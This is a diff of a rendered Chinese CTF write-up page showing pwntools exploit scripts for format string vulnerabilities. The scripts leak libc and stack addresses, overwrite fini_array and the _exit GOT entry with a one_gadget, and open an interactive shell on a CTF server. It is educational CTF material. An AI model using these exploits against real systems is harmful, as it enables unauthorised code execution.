-    io = remote(<span class="string">&#x27;&#x27;</span>,  )
-    elf = ELF(pwnfile)
-    rop = ROP(pwnfile)
-    libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span>   
-    libc = ELF(libc_name) 
-
-    fini_arry = <span class="number">0x0403198</span> 
-    main = <span class="number">0x4011ff</span>
-    printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]
-
-    payload = <span class="string">b&#x27;%41$p--%43$paaaa&#x27;</span>  + fmtstr_payload(<span class="number">8</span>, &#123;fini_arry : main&#125;, numbwritten=<span class="number">34</span>)
-    ru(<span class="string">b&#x27;payload:&#x27;</span>)
-    <span class="comment"># debug() </span>
-    io.sendline(payload)
-    ru(<span class="string">b&#x27;0x&#x27;</span>)
-    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]
-    ru(<span class="string">b&#x27;0x&#x27;</span>)
-    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x2f0</span>      <span class="comment">#0xf0 -0xe0 - 0x120</span>
-    leak(<span class="string">"libc_base"</span>, libc_base)
-    leak(<span class="string">"stack"</span>, stack)
-
-    one = <span class="number">0xe3b01</span> + libc_base     <span class="comment">#0xe3b01 0xe3b04 0xe3cf6 0x1075aa 0x1075b2 0x1075b7 0x1075c1</span>
-    payload = fmtstr_payload(<span class="number">6</span>, &#123;stack:one&#125;)
-    ru(<span class="string">b&#x27;payload:&#x27;</span>)
-    <span class="comment"># debug()</span>
-    s(payload)
-
-    itr()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#from struct import pack</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   <span class="comment">#&#x27;info&#x27;</span></span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">    <span class="comment">#io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;&#x27;</span>,  )</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span>   </span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403198</span> </span><br><span class="line">    main = <span class="number">0x4011ff</span></span><br><span class="line">    printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%41$p--%43$paaaa&#x27;</span>  + fmtstr_payload(<span class="number">8</span>, &#123;fini_arry : main&#125;, numbwritten=<span class="number">34</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug() </span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x2f0</span>      <span class="comment">#0xf0 -0xe0 - 0x120</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">    one = <span class="number">0xe3b01</span> + libc_base     <span class="comment">#0xe3b01 0xe3b04 0xe3cf6 0x1075aa 0x1075b2 0x1075b7 0x1075c1</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;stack:one&#125;)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -259,96 +132,24 @@ leak = <span class="keyword">lambda</span> name, value        : info(<span class
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071611393.png" alt="image-20240607161107350"></p>
 <p>利用二连指针修改任意地址值</p>
 <p>但是下面的payload并不能成功修改got地址   貌似使用%x$定位的话不能在同一条链子上改两次  (test&gt;exit_got)   没有将0x401030改成功</p>
-<pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span>
-payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(test-exit_got).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c%49$ln&#x27;</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(test-exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%49$ln&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071615607.png" alt="image-20240607161549570"></p>
 <p>如果是修改不同链上则可以同时修改</p>
-<pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span>
-payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png" alt="image-20240607163238561"></p>
 <p>直接使用格式化字符作为占位符的话可以在一条链子上改两次</p>
-<pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span>
-payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071654277.png" alt="image-20240607165447235"></p>
 <p>这样思路就明确了，先利用二连指针的第一个指针修改第二个指针指向exit_got，然后利用第二个指针修改exit_got地址为main函数地址</p>
 <p>由于%hn只将打印出来字符的低二字节修改内存，所以打印出来的字符长度溢出时就能修改低二字节为任意值了</p>
-<pre class=" language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment"><code class="language-highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span>
-payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071712038.png" alt="image-20240607171232992"></p>
 <p>然后栈上还残留的指向exit_got指针来修改成为one_gadget</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
-<span class="comment">#from ctypes import *</span>
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    context.log_level = <span class="string">&#x27;info&#x27;</span>
-    IPort = <span class="string">&#x27;node5.buuoj.cn 29958&#x27;</span>
-    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
-    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6&#x27;</span> 
-    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
-    elf  = ELF(pwnfile)
-    rop  = ROP(pwnfile)
-    libc = ELF(libc_name)
-
-    <span class="keyword">while</span>(<span class="literal">True</span>):
-        io = init(pwnfile, IPort, libc_name)
-        exit_got = elf.got[<span class="string">&#x27;_exit&#x27;</span>]
-        main     = elf.sym[<span class="string">&#x27;main&#x27;</span>]
-
-        ru(<span class="string">b&#x27;Gift addr: &#x27;</span>)
-        stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)
-        leak(<span class="string">"stack"</span>, stack)
-
-        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span>
-        payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span>
-        payload1 += <span class="string">b&#x27;-%17$p&#x27;</span>
-
-        <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>
-        sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload1) 
-        ru(<span class="string">b&#x27;0x&#x27;</span>)
-        libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]
-        one_gadegt = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]
-        one = libc_base + one_gadegt[<span class="number">1</span>]
-
-        ori  = one&<span class="number">0xffff</span>
-        ori1 = one>><span class="number">16</span>&<span class="number">0xffff</span>  
-        ori2 = one>><span class="number">32</span>&<span class="number">0xffff</span>
-        ori3 = one&<span class="number">0xffffffff</span>
-        leak(<span class="string">"one_gadet"</span>, one)
-        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori))
-        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))
-        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))
-
-        <span class="keyword">if</span>(ori < ori1 <span class="keyword">or</span> ori1 < ori2):
-            log.failure(<span class="string">"ori is too low..."</span>)
-            io.close()
-            <span class="keyword">continue</span>
-        <span class="keyword">else</span> :
-            payload2  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">2</span>-<span class="number">35</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">35</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>  <span class="comment">#37</span>
-            <span class="comment"># payload2 = b&#x27;\x00&#x27;</span>
-            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload2) 
-            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>
-
-            payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">4</span>-<span class="number">14</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">14</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>   <span class="comment">#16</span>
-            <span class="comment"># payload3 = b&#x27;\x00&#x27;</span>
-            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>
-            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload3) 
-
-            payload4  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori2-<span class="number">38</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;%hn&#x27;</span>       <span class="comment">#40-->4  7fxx   82-->2  xxxx    85-->0   xxxx</span>
-            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori1-ori2-<span class="number">40</span>).encode(<span class="string">"utf-8"</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span> 
-            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori-ori1-<span class="number">1</span>).encode(<span class="string">"utf-8"</span>)   + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span> + <span class="string">b&#x27;%hn&#x27;</span> 
-            payload4 += <span class="string">b&#x27;\x00&#x27;</span> 
-
-            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span>
-            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload4) 
-            <span class="built_in">print</span>(payload4)
-            itr()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 29958&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        io = init(pwnfile, IPort, libc_name)</span><br><span class="line">        exit_got = elf.got[<span class="string">&#x27;_exit&#x27;</span>]</span><br><span class="line">        main     = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        ru(<span class="string">b&#x27;Gift addr: &#x27;</span>)</span><br><span class="line">        stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;-%17$p&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">        sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload1) </span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        one_gadegt = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">        one = libc_base + one_gadegt[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        ori  = one&amp;<span class="number">0xffff</span></span><br><span class="line">        ori1 = one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>  </span><br><span class="line">        ori2 = one&gt;&gt;<span class="number">32</span>&amp;<span class="number">0xffff</span></span><br><span class="line">        ori3 = one&amp;<span class="number">0xffffffff</span></span><br><span class="line">        leak(<span class="string">&quot;one_gadet&quot;</span>, one)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ori &lt; ori1 <span class="keyword">or</span> ori1 &lt; ori2):</span><br><span class="line">            log.failure(<span class="string">&quot;ori is too low...&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            payload2  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">2</span>-<span class="number">35</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">35</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>  <span class="comment">#37</span></span><br><span class="line">            <span class="comment"># payload2 = b&#x27;\x00&#x27;</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload2) </span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line"></span><br><span class="line">            payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">4</span>-<span class="number">14</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">14</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>   <span class="comment">#16</span></span><br><span class="line">            <span class="comment"># payload3 = b&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload3) </span><br><span class="line"></span><br><span class="line">            payload4  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori2-<span class="number">38</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;%hn&#x27;</span>       <span class="comment">#40--&gt;4  7fxx   82--&gt;2  xxxx    85--&gt;0   xxxx</span></span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori1-ori2-<span class="number">40</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori-ori1-<span class="number">1</span>).encode(<span class="string">&quot;utf-8&quot;</span>)   + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload4) </span><br><span class="line">            <span class="built_in">print</span>(payload4)</span><br><span class="line">            itr()</span><br><span 